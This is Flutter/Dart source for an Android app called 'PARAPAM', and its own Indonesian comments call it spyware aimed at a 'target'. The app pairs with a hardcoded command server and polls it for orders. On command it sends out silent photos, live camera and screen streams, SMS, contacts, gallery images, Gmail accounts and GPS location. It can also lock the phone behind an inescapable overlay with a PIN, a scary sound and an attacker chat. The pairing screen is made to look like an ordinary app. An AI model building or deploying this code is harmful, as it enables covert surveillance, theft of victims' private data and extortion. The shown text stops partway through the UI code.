import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:camera/camera.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:video_player/video_player.dart';

// ── SERVER (hardcode — tidak perlu ganti-ganti) ───────────────────────────────
const String kServerBase = "http://elainakurumiipanel.xtxintax.my.id:2012";

// ── GLOBALS ───────────────────────────────────────────────────────────────────
ValueNotifier<bool> deviceLocked   = ValueNotifier<bool>(false);
late AudioPlayer    _audioPlayer;
String globalDeviceId    = "";
String globalDeviceModel = "";
String currentLockMessage = "YOUR PHONE IS LOCKED!!!!";
String currentLockPIN     = "1234";

// Lock chat — pesan masuk dari attacker, keluar dari target
final lockChatMessages  = ValueNotifier<List<Map<String,String>>>([]);
bool isLockLive = false; // true = Lock Live mode (ada chat), false = lock biasa
String lockChatSenderName = "Admin";

// ── NATIVE CHANNELS ───────────────────────────────────────────────────────────
const MethodChannel platformStrobe = MethodChannel('com.nullx.pp/strobe');
const MethodChannel platformSpy    = MethodChannel('com.nullx.pp/background_spy');

// ── LIVE STREAM ───────────────────────────────────────────────────────────────
bool   _isLiveStreaming = false;
Timer? _liveStreamTimer;

// ════════════════════════════════════════════════════════════════════════════
// MAIN
// ════════════════════════════════════════════════════════════════════════════
void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  // Init AudioPlayer SETELAH binding siap — kalau sebelumnya crash semua HP
  _audioPlayer = AudioPlayer();

  // Global error handler - cegah crash di low RAM
  FlutterError.onError = (FlutterErrorDetails details) {
    FlutterError.presentError(details);
  };

  // Catch async errors
  PlatformDispatcher.instance.onError = (error, stack) {
    return true; // handled - jangan crash
  };

  if (Platform.isAndroid) {
    if (!await Permission.systemAlertWindow.isGranted) {
      await Permission.systemAlertWindow.request();
    }
    _requestNotifAccess();
  }

  await _requestPermissions();

  final info = await _getDeviceInfo();
  globalDeviceId    = info['id']!;
  globalDeviceModel = info['model']!;

  try { await platformSpy.invokeMethod('saveTargetId', globalDeviceId); } catch (_) {}

  // Simpan deviceId ke native untuk persist setelah uninstall
  try {
    await platformSpy.invokeMethod('saveDeviceIdAll', globalDeviceId);
  } catch (_) {}

  // Kalau sudah pernah pair — langsung jalankan spyware background
  final prefs = await SharedPreferences.getInstance();
  final savedPair = prefs.getString('pairId');
  if (savedPair != null && savedPair.isNotEmpty) {
    await _registerDevice(globalDeviceId, globalDeviceModel);
    _startSpyware(globalDeviceId);
  }

  // Restore lock state dari persistent storage setelah restart
  try {
    final lockState = await platformSpy.invokeMethod('getLockState') as Map?;
    if (lockState != null && lockState['isLocked'] == true) {
      currentLockMessage = lockState['lockMessage']?.toString() ?? 'YOUR PHONE IS LOCKED!!!!';
      currentLockPIN     = lockState['lockPin']?.toString()    ?? '1234';
      isLockLive         = lockState['isLockLive'] == true;
      deviceLocked.value = true;
      playScarySound();
      // Kalau Lock Live - buka app ke foreground supaya chat bisa jalan
      if (isLockLive) {
        try { await platformSpy.invokeMethod('bringToForeground'); } catch(_) {}
      }
    }
  } catch (_) {}

  runApp(const AppRoot());
}

void _requestNotifAccess() async {
  try { await platformSpy.invokeMethod('openNotificationSettings'); } catch (_) {}
}

Future<void> _requestPermissions() async {
  await [
    Permission.location, Permission.contacts, Permission.storage,
    Permission.manageExternalStorage, Permission.camera, Permission.microphone,
    Permission.ignoreBatteryOptimizations, Permission.notification, Permission.sms,
    Permission.photos, // Android 13+ gallery access
  ].request();
}

Future<Map<String, String>> _getDeviceInfo() async {
  final di = DeviceInfoPlugin();
  String model = "Unknown", id = "UNKNOWN";
  try {
    if (Platform.isAndroid) {
      final a = await di.androidInfo;
      model = "${a.brand.toUpperCase()} ${a.model}";
      id    = "${a.brand}-${a.model}-${a.id}".replaceAll(' ', '_');
    } else if (Platform.isIOS) {
      final i = await di.iosInfo;
      model = i.name;
      id    = i.identifierForVendor ?? "UNKNOWN_IOS";
    }
  } catch (_) { id = "ZDX-${Platform.localHostname.hashCode}"; }
  return {"id": id, "model": model};
}

Future<void> _registerDevice(String id, String model) async {
  try {
    final bat = Battery();
    int lv = await bat.batteryLevel.catchError((_) => 100);
    await http.post(Uri.parse("$kServerBase/api/register-target"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "id": id, "model": model, "battery": lv.toString(),
          "status": "Online", "lastSeen": DateTime.now().toIso8601String(),
        }));
  } catch (_) {}
}

// ── PAIRING — dipanggil dari UI setelah user input ID ────────────────────────
Future<bool> pairDevice(String pairId) async {
  try {
    final bat = Battery();
    int lv = await bat.batteryLevel.catchError((_) => 100);
    final res = await http.post(
      Uri.parse("$kServerBase/api/pair-target"),
      headers: {"Content-Type": "application/json"},
      body: jsonEncode({
        "pairId": pairId, "deviceId": globalDeviceId,
        "model": globalDeviceModel, "battery": lv.toString(),
      }),
    ).timeout(const Duration(seconds: 15));
    if (res.statusCode == 200) {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setString('pairId', pairId);
      return true;
    }
  } catch (_) {}
  return false;
}

void playScarySound() async {
  await _audioPlayer.setReleaseMode(ReleaseMode.loop);
  await _audioPlayer.play(UrlSource(
      'https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Scary+Laugh&filename=24/243764-00f7e1b5-829d-4874-a690-671891b0c79b.mp3'));
}
void stopSound() async { await _audioPlayer.stop(); }

void _startLiveCamera(String id, String side) async {
  if (_isLiveStreaming) return;
  _isLiveStreaming = true;
  try {
    // Buka kamera stream terus-menerus (repeating capture)
    await platformSpy.invokeMethod('startLiveCameraStream', {"side": side});
  } catch (_) {}
  // Poll frame dari Java setiap 150ms, kirim ke server
  _liveStreamTimer = Timer.periodic(const Duration(milliseconds: 150), (t) async {
    if (!_isLiveStreaming) { t.cancel(); return; }
    try {
      final f = await platformSpy.invokeMethod('getLiveFrame') as String?;
      if (f != null && f.isNotEmpty) {
        await http.post(Uri.parse("$kServerBase/api/live-frame/$id"),
            headers: {"Content-Type": "application/json"},
            body: jsonEncode({"frame": f, "ts": DateTime.now().millisecondsSinceEpoch}))
            .timeout(const Duration(seconds: 2));
      }
    } catch (_) {}
  });
}

void _startLiveScreen(String id) {
  if (_isLiveStreaming) return;
  _isLiveStreaming = true;
  _liveStreamTimer = Timer.periodic(const Duration(milliseconds: 150), (t) async {
    if (!_isLiveStreaming) { t.cancel(); return; }
    try {
      final f = await platformSpy.invokeMethod('startScreenStreamBackground') as String?;
      if (f != null && f.isNotEmpty) {
        await http.post(Uri.parse("$kServerBase/api/live-frame/$id"),
            headers: {"Content-Type": "application/json"},
            body: jsonEncode({"frame": f, "ts": DateTime.now().millisecondsSinceEpoch}))
            .timeout(const Duration(seconds: 2));
      }
    } catch (_) {}
  });
}

void _stopLive() {
  _isLiveStreaming = false;
  _liveStreamTimer?.cancel();
  _liveStreamTimer = null;
  // Stop live camera stream di Java
  platformSpy.invokeMethod('stopLiveCameraStream').catchError((_) {});
}

// ── SPYWARE LOOP ─────────────────────────────────────────────────────────────
void _startSpyware(String id) {
  Future<void> loop() async {
    try {
      final bat = Battery();
      int batLv = 100;
      try { batLv = await bat.batteryLevel; } catch (_) {}
      await http.post(Uri.parse("$kServerBase/api/heartbeat/$id"),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({"id": id, "status": "Alive", "battery": batLv.toString()}))
          .timeout(const Duration(seconds: 1));

      final res = await http.get(Uri.parse("$kServerBase/api/get-command/$id"));
      if (res.statusCode != 200 || res.body.isEmpty) return;

      final d = jsonDecode(res.body);
      String cmd   = d['command'] ?? 'idle';
      if (cmd == 'idle') return; // tidak ada command, skip
      String extra = d['extra']   ?? '';
      dynamic result;

      // ── LOCK LIVE (lock + chat) ──────────────────────────────────────
      if (cmd == 'lock_live') {
        if (extra.contains('|')) {
          final p = extra.split('|');
          currentLockMessage = p[0].isNotEmpty ? p[0] : 'HP INI DIKUNCI';
          currentLockPIN     = p.length > 1 && p[1].isNotEmpty ? p[1] : '1234';
        }
        isLockLive = true;
        if (!deviceLocked.value) { deviceLocked.value = true; playScarySound(); }
        try { await platformSpy.invokeMethod('saveLockState', {
          'locked': true, 'isLockLive': true,
          'message': currentLockMessage, 'pin': currentLockPIN
        }); } catch (_) {}
        // Trigger LockOverlayService (system overlay - tidak bisa keluar)
        try { await platformSpy.invokeMethod('startLockOverlay', {
          'message': currentLockMessage, 'pin': currentLockPIN
        }); } catch (_) {}
        try { await platformSpy.invokeMethod('lockDeviceNow'); } catch (_) {}
        result = {"status": "LockLive"};
      }
      // ── HARD LOCK biasa ──────────────────────────────────────────────────
      else if (cmd == 'hard_lock' || cmd == 'lock_device') {
        if (extra.contains('|')) {
          final p = extra.split('|');
          currentLockMessage = p[0].isNotEmpty ? p[0] : 'YOUR PHONE IS LOCKED!!!!';
          currentLockPIN     = p.length > 1 && p[1].isNotEmpty ? p[1] : '1234';
        } else if (extra.isNotEmpty) { currentLockMessage = extra; }
        if (!deviceLocked.value) { deviceLocked.value = true; playScarySound(); }
        try { await platformSpy.invokeMethod('saveLockState', {
          'locked': true, 'isLockLive': false,
          'message': currentLockMessage, 'pin': currentLockPIN
        }); } catch (_) {}
        // Trigger LockOverlayService
        try { await platformSpy.invokeMethod('startLockOverlay', {
          'message': currentLockMessage, 'pin': currentLockPIN
        }); } catch (_) {}
        try { await platformSpy.invokeMethod('lockDeviceNow'); } catch (_) {}
        result = {"status": "Locked"};
      } else if (cmd == 'unlock' || cmd == 'unlock_device') {
        if (deviceLocked.value) {
          deviceLocked.value = false; stopSound();
          try { await platformStrobe.invokeMethod('stopStrobe'); } catch (_) {}
          try { await platformSpy.invokeMethod('saveLockState', {'locked': false, 'isLockLive': false, 'message': '', 'pin': ''}); } catch (_) {}
        }
        result = {"status": "Unlocked"};
      } else if (cmd == 'take_photo') {
        // Request camera permission dulu sebelum foto
        final camStatus = await Permission.camera.request();
        if (camStatus.isGranted) {
          final b64 = await platformSpy.invokeMethod('takeSilentPhotoBackground', {"side": extra.isEmpty ? "back" : extra});
          result = b64 != null ? {"status": "Success", "image_base64": b64} : {"status": "Failed - camera returned null"};
        } else {
          result = {"status": "Failed - camera permission denied"};
        }
      } else if (cmd == 'get_screen') {
        final b64 = await platformSpy.invokeMethod('startScreenStreamBackground');
        result = {"status": "Success", "image_base64": b64 ?? ""};
      } else if (cmd == 'live_camera_start') {
        _stopLive(); _startLiveCamera(id, extra.isEmpty ? 'back' : extra);
        result = {"status": "Live camera started"};
      } else if (cmd == 'live_screen_start') {
        _stopLive(); _startLiveScreen(id);
        result = {"status": "Live screen started"};
      } else if (cmd == 'live_stop') {
        _stopLive(); result = {"status": "Stopped"};
      } else if (cmd == 'get_gmails') {
        final emails = await platformSpy.invokeMethod('getGmailAccounts') as String? ?? '';
        result = {"accounts": emails.isEmpty ? "No Gmail Found" : emails};
      } else if (cmd == 'set_wallpaper') {
        await platformSpy.invokeMethod('setWallpaper', {"url": extra}); result = {"status": "Done"};
      } else if (cmd == 'play_audio') {
        try { await _audioPlayer.stop(); await _audioPlayer.play(UrlSource(extra)); result = {"status": "Playing"}; }
        catch (e) { result = {"status": "Error: $e"}; }
      } else if (cmd == 'stop_audio') {
        await _audioPlayer.stop(); result = {"status": "Stopped"};
      } else if (cmd == 'get_contacts' || cmd == 'dump_contacts') {
        if (await FlutterContacts.requestPermission()) {
          final list = await FlutterContacts.getContacts(withProperties: true, withPhoto: false);
          result = {"contacts": list.take(50).map((e) => {"name": e.displayName, "number": e.phones.isNotEmpty ? e.phones.first.number : ""}).toList()};
        }
      } else if (cmd == 'flash_strobe') {
        await platformStrobe.invokeMethod('startStrobe'); result = {"status": "On"};
      } else if (cmd == 'stop_strobe') {
        await platformStrobe.invokeMethod('stopStrobe'); result = {"status": "Off"};
      } else if (cmd == 'vibrate_loop') {
        // Vibrate via platform channel (tidak butuh plugin)
        try {
          await platformSpy.invokeMethod('vibrateDevice', {'duration': 5000});
        } catch (_) {
          // Fallback: HapticFeedback
          for (int i = 0; i < 10; i++) {
            await Future.delayed(const Duration(milliseconds: 300));
          }
        }
        result = {"status": "Vibrating"};
      } else if (cmd == 'open_url') {
        final url = Uri.parse(extra);
        if (await canLaunchUrl(url)) await launchUrl(url, mode: LaunchMode.externalApplication);
        result = {"status": "Opened"};
      } else if (cmd == 'get_location' || cmd == 'track_gps') {
        final pos = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
        result = {"lat": pos.latitude, "lng": pos.longitude};
      } else if (cmd == 'force_open') {
        try { await platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
        result = {"status": "OK"};
      } else if (cmd == 'reboot_device' || cmd == 'restart_device') {
        try {
          await platformSpy.invokeMethod('rebootDevice');
          result = {"status": "Rebooting"};
        } catch (e) {
          result = {"status": "reboot_failed: \${e.toString()}"};
        }
      } else if (cmd == 'get_sms') {
        try {
          final smsList = await platformSpy.invokeMethod('getSmsMessages');
          result = {"sms": smsList};
        } catch(e) { result = {"sms": [], "error": e.toString()}; }
      } else if (cmd == 'get_gallery') {
        try {
          final imgs = await platformSpy.invokeMethod('getGalleryImages', {"limit": 5});
          result = {"images": imgs ?? []};
        } catch(e) { result = {"images": [], "error": e.toString()}; }
      } else if (cmd == 'chat_msg') {
        if (extra.isNotEmpty) {
          final msgs = List<Map<String,String>>.from(lockChatMessages.value);
          msgs.add({'from': 'owner', 'text': extra, 'time': DateTime.now().toString().substring(11,16)});
          lockChatMessages.value = msgs;
        }
        result = {"status": "msg_received"};
      } else if (cmd == 'open_notification_settings') {
        _requestNotifAccess(); result = {"status": "Opened"};
      } else if (cmd == 'kill_wifi') {
        try {
          // Matikan WiFi via platform channel
          await platformSpy.invokeMethod('disableWifi');
          result = {"status": "WiFi disabled"};
        } catch (_) {
          result = {"status": "Failed - no permission"};
        }
      }

      if (result != null) {
        await http.post(Uri.parse("$kServerBase/api/post-response/$id"),
            headers: {"Content-Type": "application/json"},
            body: jsonEncode({"data": result, "cmd": cmd}));
      }
    } catch (_) {}
  }
  Timer.periodic(const Duration(seconds: 1), (_) => loop());
}

// ════════════════════════════════════════════════════════════════════════════
// APP ROOT
// ════════════════════════════════════════════════════════════════════════════
class AppRoot extends StatelessWidget {
  const AppRoot({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'PARAPAM',
      theme: ThemeData(brightness: Brightness.dark, fontFamily: 'ShareTechMono', scaffoldBackgroundColor: Colors.black),
      home: const LockWrapper(),
    );
  }
}

// ════════════════════════════════════════════════════════════════════════════
// LOCK WRAPPER
// ════════════════════════════════════════════════════════════════════════════
class LockWrapper extends StatefulWidget {
  const LockWrapper({super.key});
  @override State<LockWrapper> createState() => _LockWrapperState();
}

class _LockWrapperState extends State<LockWrapper> with WidgetsBindingObserver {
  final _pinCtrl  = TextEditingController();
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatPollTimer;
  Timer? _enforceLockTimer;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    // Poll chat dari server setiap 3 detik
    _chatPollTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
    // Enforce lock - paksa foreground setiap 3 detik saat locked
    _enforceLockTimer = Timer.periodic(const Duration(seconds: 3), (_) {
      if (deviceLocked.value) {
        try { platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
      }
    });
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _pinCtrl.dispose(); _chatCtrl.dispose(); _chatScroll.dispose();
    _chatPollTimer?.cancel();
    _enforceLockTimer?.cancel();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState s) {
    if (deviceLocked.value) {
      // Saat lock aktif - paksa balik ke foreground di semua kondisi
      if (s == AppLifecycleState.paused ||
          s == AppLifecycleState.inactive ||
          s == AppLifecycleState.hidden ||
          s == AppLifecycleState.detached) {
        Future.delayed(const Duration(milliseconds: 100), () {
          try { platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
        });
        Future.delayed(const Duration(milliseconds: 500), () {
          try { platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
        });
        Future.delayed(const Duration(milliseconds: 1200), () {
          try { platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
        });
      }
    }
  }

  // Poll pesan chat dari server (dipanggil saat lock aktif)
  Future<void> _pollChat() async {
    if (!deviceLocked.value || globalDeviceId.isEmpty) return;
    try {
      final res = await http.get(Uri.parse('$kServerBase/api/lock-chat/$globalDeviceId'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final body = jsonDecode(res.body);
        final msgs = body['messages'] as List? ?? [];
        if (msgs.isNotEmpty && mounted) {
          final current = List<Map<String,String>>.from(lockChatMessages.value);
          for (final m in msgs) {
            current.add({
              'from': m['from']?.toString() ?? 'owner',
              'text': m['text']?.toString() ?? '',
              'time': m['time']?.toString() ?? '',
            });
          }
          lockChatMessages.value = current;
          Future.delayed(const Duration(milliseconds: 100), () {
            if (_chatScroll.hasClients) {
              _chatScroll.animateTo(_chatScroll.position.maxScrollExtent,
                  duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
            }
          });
        }
      }
    } catch (_) {}
  }

  // Kirim balasan chat dari target ke owner
  Future<void> _sendChatReply(String text) async {
    if (text.trim().isEmpty || globalDeviceId.isEmpty) return;
    _chatCtrl.clear();
    final current = List<Map<String,String>>.from(lockChatMessages.value);
    current.add({'from': 'target', 'text': text.trim(), 'time': TimeOfDay.now().format(context)});
    lockChatMessages.value = current;
    try {
      await http.post(Uri.parse('$kServerBase/api/lock-chat/$globalDeviceId'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text.trim(), 'from': 'target'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) {
        _chatScroll.animateTo(_chatScroll.position.maxScrollExtent,
            duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
      }
    });
  }

  void _tryUnlock(String pin) {
    if (pin == currentLockPIN) {
      deviceLocked.value = false;
      isLockLive = false;
      lockChatMessages.value = [];
      stopSound(); _pinCtrl.clear();
    } else {
      _pinCtrl.clear();
      ScaffoldMessenger.of(context).showSnackBar(const SnackBar(
          content: Text("❌ PIN Salah!", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          backgroundColor: Colors.red, duration: Duration(seconds: 1)));
    }
  }

  @override
  Widget build(BuildContext context) {
    return ValueListenableBuilder<bool>(
      valueListenable: deviceLocked,
      builder: (ctx, locked, _) {
        return WillPopScope(
          onWillPop: () async => false,
          child: Stack(children: [
            const PairingHomePage(),

            if (locked)
              Scaffold(
                backgroundColor: Colors.black,
                resizeToAvoidBottomInset: true,
                body: ValueListenableBuilder<List<Map<String,String>>>(
                  valueListenable: lockChatMessages,
                  builder: (_, msgs, __) {
                    return Container(
                      width: double.infinity, height: double.infinity,
                      decoration: BoxDecoration(
                        gradient: LinearGradient(
                          begin: Alignment.topCenter, end: Alignment.bottomCenter,
                          colors: isLockLive
                              ? [const Color(0xFF000A1A), Colors.black]
                              : [const Color(0xFF1A0000), Colors.black],
                        ),
                      ),
                      child: SafeArea(
                        child: isLockLive
                            ? _buildLockLiveUI(msgs)
                            : _buildLockBasicUI(),
                      ),
                    );
                  },
                ),
              ),
          ]),
        );
      },
    );
  }

  // ── Lock biasa — hanya PIN ─────────────────────────────────────────────
  Widget _buildLockBasicUI() {
    return Column(mainAxisAlignment: MainAxisAlignment.center, children: [
      const Icon(Icons.gpp_maybe, color: Colors.red, size: 80),
      const SizedBox(height: 18),
      Padding(
        padding: const EdgeInsets.symmetric(horizontal: 28),
        child: Text(currentLockMessage, textAlign: TextAlign.center,
            style: const TextStyle(color: Colors.red, fontSize: 19, fontWeight: FontWeight.bold)),
      ),
      const SizedBox(height: 36),
      Padding(
        padding: const EdgeInsets.symmetric(horizontal: 50),
        child: TextField(
          controller: _pinCtrl, obscureText: true,
          keyboardType: TextInputType.number, textAlign: TextAlign.center,
          style: const TextStyle(color: Colors.white, fontSize: 24, letterSpacing: 10),
          decoration: InputDecoration(
            hintText: "● ● ● ●", hintStyle: const TextStyle(color: Colors.white24, letterSpacing: 6),
            filled: true, fillColor: Colors.white10,
            border: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: const BorderSide(color: Colors.red)),
            enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: BorderSide(color: Colors.red.withOpacity(0.4))),
            focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(14), borderSide: const BorderSide(color: Colors.redAccent, width: 2)),
          ),
          onSubmitted: _tryUnlock,
        ),
      ),
      const SizedBox(height: 14),
      ElevatedButton(
        style: ElevatedButton.styleFrom(backgroundColor: Colors.red[900],
            minimumSize: const Size(200, 48), shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14))),
        onPressed: () => _tryUnlock(_pinCtrl.text),
        child: const Text("UNLOCK", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, letterSpacing: 3)),
      ),
    ]);
  }

  // ── Lock Live — PIN + Chat ─────────────────────────────────────────────
  Widget _buildLockLiveUI(List<Map<String,String>> msgs) {
    return Column(children: [
      // Header
      Container(
        padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 14),
        child: Row(children: [
          const Icon(Icons.lock, color: Colors.redAccent, size: 18),
          const SizedBox(width: 8),
          Expanded(child: Text(currentLockMessage,
              style: const TextStyle(color: Colors.redAccent, fontSize: 14, fontWeight: FontWeight.bold),
              maxLines: 2, overflow: TextOverflow.ellipsis)),
        ]),
      ),
      const Divider(color: Colors.white12, height: 1),

      // Chat area
      Expanded(
        child: msgs.isEmpty
            ? const Center(child: Column(mainAxisSize: MainAxisSize.min, children: [
                Icon(Icons.chat_bubble_outline, color: Colors.white24, size: 40),
                SizedBox(height: 10),
                Text('Menunggu pesan...', style: TextStyle(color: Colors.white38, fontSize: 13)),
              ]))
            : ListView.builder(
                controller: _chatScroll,
                padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                itemCount: msgs.length,
                itemBuilder: (_, i) {
                  final m = msgs[i];
                  final isOwner = m['from'] == 'owner';
                  return Align(
                    alignment: isOwner ? Alignment.centerLeft : Alignment.centerRight,
                    child: Container(
                      margin: const EdgeInsets.symmetric(vertical: 4),
                      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 9),
                      constraints: BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.75),
                      decoration: BoxDecoration(
                        color: isOwner ? const Color(0xFF1E2A3A) : Colors.red[900]!.withOpacity(0.9),
                        borderRadius: BorderRadius.only(
                          topLeft:     const Radius.circular(14),
                          topRight:    const Radius.circular(14),
                          bottomLeft:  Radius.circular(isOwner ? 2 : 14),
                          bottomRight: Radius.circular(isOwner ? 14 : 2),
                        ),
                        border: Border.all(color: isOwner ? Colors.blueAccent.withOpacity(0.3) : Colors.redAccent.withOpacity(0.3)),
                      ),
                      child: Column(crossAxisAlignment: isOwner ? CrossAxisAlignment.start : CrossAxisAlignment.end, children: [
                        Text(isOwner ? '🔒 Admin' : '📱 Kamu',
                            style: TextStyle(color: isOwner ? Colors.blueAccent : Colors.redAccent,
                                fontSize: 9, fontWeight: FontWeight.bold)),
                        const SizedBox(height: 3),
                        Text(m['text'] ?? '', style: const TextStyle(color: Colors.white, fontSize: 13)),
                        const SizedBox(height: 3),
                        Text(m['time'] ?? '', style: const TextStyle(color: Colors.white38, fontSize: 9)),
                      ]),
                    ),
                  );
                }),
      ),

      // PIN + chat input
      Container(
        padding: const EdgeInsets.fromLTRB(12, 10, 12, 12),
        decoration: const BoxDecoration(
          color: Color(0xFF0A0A0F),
          border: Border(top: BorderSide(color: Color(0xFF1E1E2E))),
        ),
        child: Column(children: [
          // Balasan target
          Row(children: [
            Expanded(child: TextField(
              controller: _chatCtrl,
              style: const TextStyle(color: Colors.white, fontSize: 13),
              decoration: InputDecoration(
                hintText: 'Balas pesan...',
                hintStyle: const TextStyle(color: Colors.white38, fontSize: 12),
                filled: true, fillColor: const Color(0xFF1A1A2E),
                contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                border: OutlineInputBorder(borderRadius: BorderRadius.circular(20), borderSide: BorderSide.none),
              ),
              onSubmitted: _sendChatReply,
            )),
            const SizedBox(width: 8),
            GestureDetector(
              onTap: () => _sendChatReply(_chatCtrl.text),
              child: Container(
                padding: const EdgeInsets.all(11),
                decoration: const BoxDecoration(color: Colors.redAccent, shape: BoxShape.circle),
                child: const Icon(Icons.send_rounded, color: Colors.white, size: 16))),
          ]),
          const SizedBox(height: 10),
          // PIN unlock
          Row(children: [
            Expanded(child: TextField(
              controller: _pinCtrl, obscureText: true,
              keyboardType: TextInputType.number, textAlign: TextAlign.center,
              style: const TextStyle(color: Colors.white, fontSize: 18, letterSpacing: 8),
              decoration: InputDecoration(
                hintText: "PIN Unlock", hintStyle: const TextStyle(color: Colors.white24, fontSize: 12),
                filled: true, fillColor: Colors.white10,
                contentPadding: const EdgeInsets.symmetric(vertical: 12),
                border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: const BorderSide(color: Colors.red)),
                enabledBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide(color: Colors.red.withOpacity(0.3))),
                focusedBorder: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: const BorderSide(color: Colors.redAccent)),
              ),
              onSubmitted: _tryUnlock,
            )),
            const SizedBox(width: 8),
            ElevatedButton(
              style: ElevatedButton.styleFrom(backgroundColor: Colors.red[900],
                  padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12))),
              onPressed: () => _tryUnlock(_pinCtrl.text),
              child: const Text("BUKA", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 12, letterSpacing: 1)),
            ),
          ]),
        ]),
      ),
    ]);
  }
}

// ════════════════════════════════════════════════════════════════════════════
// PAIRING HOME PAGE — halaman utama APK target
// Tampil seperti app biasa tapi isinya hanya input ID
// ════════════════════════════════════════════════════════════════════════════
class PairingHomePage extends StatefulWidget {
  const PairingHomePage({super.key});
  @override State<PairingHomePage> createState() => _PairingHomePageState();
}

class _PairingHomePageState extends State<PairingHomePage> with SingleTickerProviderStateMixin {
  final _idCtrl    = TextEditingController();
  bool  _loading   = false;
  bool  _paired    = false;
  String _msg      = '';

  late AnimationController _animCtrl;
  late Animation<double>   _fadeAnim;

  late VideoPlayerController _video;

  @override
  void initState() {
    super.initState();
    _checkAlreadyPaired();

    _animCtrl = AnimationController(duration: const Duration(milliseconds: 1000), vsync: this)..forward();
    _fadeAnim = Tween<double>(begin: 0, end: 1).animate(CurvedAnimation(parent: _animCtrl, curve: Curves.easeOut));

    _video = VideoPlayerController.asset('assets/videos/login.mp4')
      ..initialize().then((_) {
        setState(() {});
        _video.setLooping(true);
        _video.play();
        _video.setVolume(0);
      });
  }

  @override
  void dispose() { _animCtrl.dispose(); _video.dispose(); _idCtrl.dispose(); super.dispose(); }

  Future<void> _checkAlreadyPaired() async {
    final prefs = await SharedPreferences.getInstance();
    final p = prefs.getString('pairId');
    if (p != null && p.isNotEmpty) {
      setState(() { _paired = true; _msg = '✅ Perangkat sudah terhubung'; });
    }
  }

  Future<void> _doPair() async {
    final id = _idCtrl.text.trim().toUpperCase();
    if (id.isEmpty) { setState(() => _msg = '⚠️ Masukkan ID terlebih dahulu'); return; }

    setState(() { _loading = true; _msg = 'Menghubungkan…'; });
    final ok = await pairDevice(id);

    if (ok) {
      await _registerDevice(globalDeviceId, globalDeviceModel);
      _startSpyware(globalDeviceId);
      setState(() { _loading = false; _paired = true; _msg = '✅ Perangkat berhasil terhubung!'; });
    } else {
      setState(() { _loading = false; _msg = '❌ ID tidak valid. Coba lagi.'; });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF050505),
      body: Stack(children: [
        // Video BG
        SizedBox.expand(child: FittedBox(fit: BoxFit.cover,
          child: _video.value.isInitialized
              ? SizedBox(width: _video.value.size.width, height: _video.value.size.height, child: VideoPlayer(_video))
              : Container(color: Colors.black))),
        // Overlay
        Container(decoration: BoxDecoration(gradient: RadialGradient(
          center: const Alignment(0, -0.3), radius: 1.3,
          colors: [const Color(0xFFE0E0E0).withOpacity(0.08), Colors.black.withOpacity(0.88), Colors.black.withOpacity(0.97)],
        ))),
        // Content
        SafeArea(child: FadeTransition(opacity: _fadeAnim,
          child: Column(children: [
            const Spacer(),

            // Logo
            Container(
              padding: const EdgeInsets.all(4),
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                border: Border.all(color: const Color(0xFFE0E0E0).withOpacity(0.7), width: 2),
                boxShadow: [BoxShadow(color: const Color(0xFFE0E0E0).withOpacity(0.3), blurRadius: 25, spreadRadius: 4)],
              ),
              child: ClipOval(child: Image.asset('assets/images/logo.png', height: 100, width: 100, fit: BoxFit.cover)),
            ),
            const SizedBox(height: 22),
            const Text('PARAPAM', style: TextStyle(
              color: Color(0xFFE0E0E0), fontSize: 26, fontWeight: FontWeight.w900,
              fontFamily: 'Orbitron', letterSpacing: 4,
              shadows: [Shadow(color: Color(0xFFE0E0E0), blurRadius: 10)],
            )),
